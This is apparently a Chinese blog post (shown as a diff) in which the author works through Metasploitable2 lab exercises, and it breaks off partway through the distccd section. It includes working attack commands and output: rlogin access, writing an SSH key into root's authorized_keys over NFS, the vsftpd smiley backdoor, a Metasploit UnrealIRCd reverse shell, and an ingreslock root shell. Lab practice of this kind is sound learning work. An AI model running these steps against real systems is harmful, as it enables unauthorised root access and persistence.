@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"h31i.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"slideLeftIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="metasploitable2 是一个漏洞演习系统，基于ubuntu。本身设计作为安全工具测试和演示常见漏洞攻击，主要用来作为MSF攻击用的靶机，是一个具有无数漏洞和开放了无数高危端口的渗透演习系统。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploitable2的渗透测试学习">
+<meta property="og:url" content="https://h31i.github.io/2019/08/14/linux-kali-metasploitable2/index.html">
+<meta property="og:site_name" content="h31i的吐槽">
+<meta property="og:description" content="metasploitable2 是一个漏洞演习系统，基于ubuntu。本身设计作为安全工具测试和演示常见漏洞攻击，主要用来作为MSF攻击用的靶机，是一个具有无数漏洞和开放了无数高危端口的渗透演习系统。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://files.readme.io/dd6e49c-metasploitable-web-home-page.png">
+<meta property="article:published_time" content="2019-08-14T00:54:36.000Z">
+<meta property="article:modified_time" content="2019-08-16T16:25:16.000Z">
+<meta property="article:author" content="h31i">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="ubuntu">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.readme.io/dd6e49c-metasploitable-web-home-page.png">
+
+<link rel="canonical" href="https://h31i.github.io/2019/08/14/linux-kali-metasploitable2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>metasploitable2的渗透测试学习 | h31i的吐槽</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?9ad7332814c43e21c73f845f5ef9dd80";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">h31i的吐槽</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/h31i" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://h31i.github.io/2019/08/14/linux-kali-metasploitable2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/39379493?s=460&v=4">
+      <meta itemprop="name" content="h31i">
+      <meta itemprop="description" content="love&peace">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h31i的吐槽">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          metasploitable2的渗透测试学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-14 08:54:36" itemprop="dateCreated datePublished" datetime="2019-08-14T08:54:36+08:00">2019-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>metasploitable2 是一个漏洞演习系统，基于ubuntu。本身设计作为安全工具测试和演示常见漏洞攻击，主要用来作为MSF攻击用的靶机，是一个具有无数漏洞和开放了无数高危端口的渗透演习系统。</p>
+<span id="more"></span>
+
+<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p>Metasploitable 2两个下载位置</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://information.rapid7.com/metasploitable-download.html">https://information.rapid7.com/metasploitable-download.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/metasploitable/">https://sourceforge.net/projects/metasploitable/</a></li>
+</ul>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>username:   msfadmin</p>
+<p>password:   msfadmin</p>
+<p>使用ifconfig查看IP地址，得到IP为192.168.111.146</p>
+<p><strong>关于kali的话我使用的是win10中的kali</strong>，需要安装很多的工具和库，希望做过这写test可以让我的WinKali有个完整的工具系统</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><p>在使用子系统时nmap是无法正常工作的，查询得知和子系统使用套接字有关，待问题解决可使用子系统再玩一遍</p>
+<p>下面结果是kali虚拟机的结果</p>
+<p>使用nmap进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@PQ:~<span class="comment"># nmap -p0-65535 192.168.111.146</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-18 12:59 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (192.168.111.146)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65506 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">23/tcp    open  telnet</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span></span><br><span class="line">513/tcp   open  login</span><br><span class="line">514/tcp   open  shell</span><br><span class="line">1099/tcp  open  rmiregistry</span><br><span class="line">1524/tcp  open  ingreslock</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">2121/tcp  open  ccproxy-ftp</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">3632/tcp  open  distccd</span><br><span class="line">5432/tcp  open  postgresql</span><br><span class="line">5900/tcp  open  vnc</span><br><span class="line">6000/tcp  open  X11</span><br><span class="line">6667/tcp  open  irc</span><br><span class="line">6697/tcp  open  ircs-u</span><br><span class="line">8009/tcp  open  ajp13</span><br><span class="line">8180/tcp  open  unknown</span><br><span class="line">8787/tcp  open  msgsrvr</span><br><span class="line">34609/tcp open  unknown</span><br><span class="line">35752/tcp open  unknown</span><br><span class="line">39086/tcp open  unknown</span><br><span class="line">48560/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:5A:C7:D5 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.37 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="Unix-Basics"><a href="#Unix-Basics" class="headerlink" title="Unix Basics"></a>Unix Basics</h3><p>TCP端口512,513和514被称为“r”服务，并且已被错误配置为允许从任何主机进行远程访问（标准的“.rhosts + +”情况）。要利用此功能，请确保已安装“rsh-client”客户端（在Ubuntu上），并以本地root用户身份运行以下命令。如果系统提示您输入SSH密钥，则表示尚未安装rsh-client工具且Ubuntu默认使用SSH。</p>
+<p>(为什么我用root连不上，生气)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@PQ:~<span class="comment"># rlogin -l msfadmin 192.168.111.146</span></span><br><span class="line">msfadmin@192.168.111.146<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To access official Ubuntu documentation, please visit:</span></span><br><span class="line"><span class="string">http://help.ubuntu.com/</span></span><br><span class="line"><span class="string">No mail.</span></span><br><span class="line"><span class="string">Last login: Tue Jul 17 23:38:57 2018</span></span><br><span class="line"><span class="string">msfadmin@metasploitable:~$ ls</span></span><br><span class="line"><span class="string">vulnerable</span></span><br><span class="line"><span class="string">msfadmin@metasploitable:~$ </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>这很简单。我们应该关注的下一个服务是网络文件系统（NFS）。可以通过直接探测端口2049或向端口映射器询问服务列表来识别NFS。以下示例rpcinfo用于标识NFS并showmount -e确定正在导出“/”共享（文件系统的根目录）。您需要跟随rpcbind和nfs-common Ubuntu软件包。</p>
+<p>需要安装rpcbind和nfs-common</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@PQ:~<span class="comment"># rpcinfo -p 192.168.111.146</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  52576  status</span><br><span class="line">    100024    1   tcp  34609  status</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100021    1   udp  41332  nlockmgr</span><br><span class="line">    100021    3   udp  41332  nlockmgr</span><br><span class="line">    100021    4   udp  41332  nlockmgr</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100021    1   tcp  39086  nlockmgr</span><br><span class="line">    100021    3   tcp  39086  nlockmgr</span><br><span class="line">    100021    4   tcp  39086  nlockmgr</span><br><span class="line">    100005    1   udp  56322  mountd</span><br><span class="line">    100005    1   tcp  48560  mountd</span><br><span class="line">    100005    2   udp  56322  mountd</span><br><span class="line">    100005    2   tcp  48560  mountd</span><br><span class="line">    100005    3   udp  56322  mountd</span><br><span class="line">    100005    3   tcp  48560  mountd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@PQ:~<span class="comment"># showmount -e 192.168.111.146</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.111.146:</span><br><span class="line">/ *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用像这样的可写文件系统访问系统是微不足道的。为此（并且因为SSH正在运行），我们将在攻击系统上生成新的SSH密钥，挂载NFS导出，并将我们的密钥添加到root用户帐户的authorized_keys文件中：</p>
+<p><strong>这个test没有成功，先留下官方步骤，以后再做研究</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ssh-keygen</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /root/.ssh/id_rsa.pub.</span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># mkdir /tmp/r00t</span></span><br><span class="line">root@ubuntu:~<span class="comment"># mount -t nfs 192.168.99.131:/ /tmp/r00t/</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/r00t/root/.ssh/authorized_keys</span></span><br><span class="line">root@ubuntu:~<span class="comment"># umount /tmp/r00t</span></span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># ssh root@192.168.99.131</span></span><br><span class="line">Last login: Fri Jun  1 00:29:33 2012 from 192.168.99.128</span><br><span class="line">Linux metasploitable 2.6.24-16-server <span class="comment">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span></span><br><span class="line"></span><br><span class="line">root@metasploitable:~<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="Backdoors"><a href="#Backdoors" class="headerlink" title="Backdoors"></a>Backdoors</h3><p>在端口21上，Metasploitable2运行vsftpd，一个流行的FTP服务器。这个特定的版本包含一个后门，由一个未知的入侵者插入到源代码中。后门被迅速识别并删除，但不是在很多人下载之前。如果发送的用户名以序列:)[愉快的面孔]结束，则后门版本将在端口6200上打开侦听shell。我们可以使用telnet演示或使用Metasploit Framework模块自动利用它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#自己做的步骤太乱只有用官方的了。好神奇</span></span><br><span class="line">root@ubuntu:~<span class="comment"># telnet 192.168.99.131 21</span></span><br><span class="line">Trying 192.168.99.131...</span><br><span class="line">Connected to 192.168.99.131.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">user backdoored:)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">pass invalid</span><br><span class="line">^]</span><br><span class="line">telnet&gt; quit</span><br><span class="line">Connection closed.</span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># telnet 192.168.99.131 6200</span></span><br><span class="line">Trying 192.168.99.131...</span><br><span class="line">Connected to 192.168.99.131.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"><span class="built_in">id</span>;</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在端口6667上，Metasploitable2运行UnreaIRCD IRC守护程序。这个版本包含一个几个月未被注意到的后门- 通过在任何侦听端口上向系统命令发送字母“AB”来触发。Metasploit有一个模块可以利用它来获得交互式shell，如下所示。</p>
+<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor">CVE-2010-2075</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@PQ:~<span class="comment"># service postgresql start</span></span><br><span class="line">root@PQ:~<span class="comment"># msfconsole</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________</span><br><span class="line">&lt; metasploit &gt;</span><br><span class="line"> ------------</span><br><span class="line">       \   ,__,</span><br><span class="line">        \  (oo)____</span><br><span class="line">           (__)    )\</span><br><span class="line">              ||--|| *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.16.57-dev                         ]</span><br><span class="line">+ -- --=[ 1769 exploits - 1007 auxiliary - 307 post       ]</span><br><span class="line">+ -- --=[ 537 payloads - 41 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor </span><br><span class="line">msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="built_in">set</span> RHOST 192.168.111.146</span><br><span class="line">RHOST =&gt; 192.168.111.146</span><br><span class="line">msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.111.144:4444 </span><br><span class="line">[*] 192.168.111.146:6667 - Connected to 192.168.111.146:6667...</span><br><span class="line">    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...</span><br><span class="line">[*] 192.168.111.146:6667 - Sending backdoor <span class="built_in">command</span>...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> p7QLbshaU0cGGxky;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;p7QLbshaU0cGGxky\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>不那么微妙的是旧的备用“ingreslock”后门正在侦听端口1524.十年前，ingreslock端口是一个受欢迎的选择，用于为受感染的服务器添加后门。访问它很容易：</p>
+<p>真可怕，直接root用户 <strong>!!!!!</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@PQ:~<span class="comment"># telnet 192.168.111.146 1524</span></span><br><span class="line">Trying 192.168.111.146...</span><br><span class="line">Connected to 192.168.111.146.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">root@metasploitable:/<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@metasploitable:/<span class="comment"># root@metasploitable:/# </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><h3 id="Unintentional-Backdoors"><a href="#Unintentional-Backdoors" class="headerlink" title="Unintentional Backdoors"></a>Unintentional Backdoors</h3><p>除了上一节中的恶意后门之外，一些服务本质上几乎是后门。安装在Metasploitable2上的第一个是distccd。该程序可以轻松地在类似配置的系统的服务器场中扩展大型编译器作业。此服务的问题在于攻击者可以轻易地滥用它来运行他们选择的命令，如下面的Metasploit模块使用所示。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root@PQ:~<span class="comment"># msfconsole </span></span><br><span class="line"></span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span 